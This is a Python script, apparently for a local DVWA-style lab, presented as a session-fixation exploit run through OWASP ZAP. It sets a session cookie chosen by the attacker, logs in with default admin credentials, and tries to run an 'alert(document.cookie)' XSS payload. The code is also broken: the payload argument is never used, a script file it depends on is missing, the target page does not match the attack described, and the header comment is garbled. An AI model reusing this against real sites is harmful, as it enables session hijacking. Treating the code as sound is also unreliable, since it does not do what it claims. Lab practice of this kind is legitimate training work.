# Session Fixation using OWASP ZAP
# Session Fixation is a type of attack where the attacker tricks the user into using a session identifier chosen by the attacker, thereby obtaining income to the session/credentials.
# OWASP ZAP (Zed Attack Proxy) is an open-source penetration testing tool for finding vulnerabilities in web applications.

import requests
from zapv2 import ZAPv2
import time

class SessionFixationExploitation:
    
    def __init__(self, target, zap_proxy):
        self.target = target
        self.zap = ZAPv2(proxies={'http': zap_proxy, 'https': zap_proxy})
        self.session = requests.Session()
    
    def set_cookie(self, session_cookie):
        self.session.cookies.set('PHPSESSID', session_cookie, domain='127.0.0.1')
    
    def login_to_target(self, username, password):
        login_payload = {'username': username, 'password': password, 'Login': 'Login'}
        self.session.post(f'{self.target}', data=login_payload)

    def execute_js_using_zap(self, js_code):
        self.zap.script.load(scriptname = 'alert_script', scripttype = 'proxy', scriptengine = 'ECMAScript', filename='alert_script.js', scriptdescription='', contextid=None)
        self.zap.script.enable('alert_script')
        self.zap.script.run_stand_alone_script('alert_script')

    def xhr_request(self, uri):
        res = self.session.get(uri)
        if res.status_code == 200:
            return res.text
        else:
            return None

def main():
    
    target = "http://127.0.0.1/vulnerabilities/xss_d/"
    zap_proxy = "http://127.0.0.1:8080"
    
    # Create instance of the exploitation class
    exploitation = SessionFixationExploitation(target=target, zap_proxy=zap_proxy)
    
    session_cookie = 'attacker_session_value'
    
    # Set the session cookie for the forged session
    exploitation.set_cookie(session_cookie)
    
    # Login to the target application
    exploitation.login_to_target(username="admin", password="password")
    
    # Set to ZAP to execute script (which would include session steal/fixation related JavaScript)
    js_code = "alert(document.cookie);"
    exploitation.execute_js_using_zap(js_code)
    
    # Example - triggering an XHR request using the fixed session
    response = exploitation.xhr_request(target)
    print(response)

if __name__ == "__main__":
    main()
